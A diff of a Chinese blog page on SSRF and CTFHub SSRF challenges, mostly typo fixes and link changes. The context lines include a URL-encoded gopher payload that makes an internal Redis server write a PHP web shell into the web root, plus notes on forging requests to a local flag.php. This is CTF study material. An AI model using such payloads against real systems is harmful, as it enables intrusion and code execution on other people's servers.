@@ -38,7 +38,7 @@
 
    <style>
     body{
-       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-image: url(https://epicture.oss-cn-beijing.aliyuncs.com/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
        background-repeat:no-repeat;
        background-size: cover;
        background-attachment:fixed;
@@ -871,6 +871,7 @@ typedef struct &#123;
 <li>PHP-FPM监听在本机9000端口</li>
 </ul>
 <p>例题参考</p>
+<p><a href="https://ethe448.github.io/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/#toc-heading-5">陇原战役复现 | Ethe&#39;s blog (ethe448.github.io)</a></p>
 <h1 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h1><p>对于SSRF的限制大致有如下几种：</p>
 <ul>
 <li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li>
@@ -997,9 +998,9 @@ print(a)</code></pre>
 <pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;10.244.80.69:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>
 
 <p>打进去之后访问一下shell.php</p>
-<p>(这里如果直接把payload接在url的参数需要再进行一次url编码</p>
+<p>(这里如果直接把payload接在url的参数上需要再进行一次url编码</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183648401.png" alt="image-20220426183648401"></p>
-<h2 id="CTFHUB-SSRF"><a href="#CTFHUB-SSRF" class="headerlink" title="CTFHUB SSRF"></a>CTFHUB SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>确定存在ssr</p>
+<h2 id="CTFHUB-SSRF"><a href="#CTFHUB-SSRF" class="headerlink" title="CTFHUB SSRF"></a>CTFHUB SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>确定存在ssrf</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204537390.png" alt="image-20220428204537390"></p>
 <p>题目说了flag在127.0.0.1的flag.php里</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204620736.png" alt="image-20220428204620736"></p>
@@ -1030,7 +1031,7 @@ key&#x3D;646e343c70a1b9d07661c4343b0e5e72</code></pre>
 
 <p>然后再用谷歌的hackbar进行一次编码</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429113209009.png" alt="image-20220429113209009"></p>
-<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>和post差不多吗，但是要穿的是文件，所以改一下前端页面，加个提交按钮，抓包</p>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>和post差不多吗，但是要传的是文件，所以改一下前端页面，加个提交按钮，抓包</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429160323521.png" alt="image-20220429160323521"></p>
 <p>然后直接把整个请求包改了host之后去url编码一次</p>
 <pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1
@@ -1959,7 +1960,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">159.9k</span>
+                        class="white-color">159.8k</span>
             
             
             
